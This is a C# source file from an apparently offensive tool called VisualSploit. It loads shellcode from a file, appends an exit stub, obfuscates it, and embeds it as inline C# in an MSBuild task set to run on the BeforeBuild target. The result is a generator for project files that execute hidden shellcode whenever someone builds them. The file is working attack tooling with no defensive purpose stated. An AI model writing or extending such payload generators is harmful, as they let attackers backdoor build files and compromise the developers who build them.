using VisualSploit.Obfuscation;

namespace VisualSploit;

static class Payload
{
    public static string Generate(string shellcodePath, ObfuscationConfig config)
    {
        var shellcode = ParseShellcode(shellcodePath);

        var payloadCode = ObfuscationEngine.Generate(shellcode, config);

        return $$"""
            <UsingTask TaskName="InlineCode" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
              <Task>
                <Code Type="Fragment" Language="cs">
                <![CDATA[
            {{payloadCode}}
                ]]>
                </Code>
              </Task>
            </UsingTask>
            <Target Name="BeforeBuild">
              <InlineCode/>
            </Target>
            """;
    }

    static byte[] ParseShellcode(string path)
    {
        if (!File.Exists(path))
            throw new FileNotFoundException($"Shellcode file not found: {path}");

        var content = File.ReadAllText(path).Trim();
        byte[] shellcode;

        if (content.StartsWith("0x") || IsHexString(content.Replace(" ", "").Replace("\r", "").Replace("\n", "")))
        {
            var hex = content.Replace("0x", "").Replace(" ", "").Replace("\r", "").Replace("\n", "").Replace(",", "");
            shellcode = Convert.FromHexString(hex);
        }
        else
        {
            shellcode = File.ReadAllBytes(path);
        }

        return AppendExitStub(shellcode);
    }

    static byte[] AppendExitStub(byte[] shellcode)
    {
        byte[] exitStub = [0x48, 0x83, 0xC4, 0x38, 0xC3];

        var result = new byte[shellcode.Length + exitStub.Length];
        shellcode.CopyTo(result, 0);
        exitStub.CopyTo(result, shellcode.Length);
        return result;
    }

    static bool IsHexString(string str) =>
        str.Length > 0 && str.Length % 2 == 0 && str.All(c => Uri.IsHexDigit(c));
}
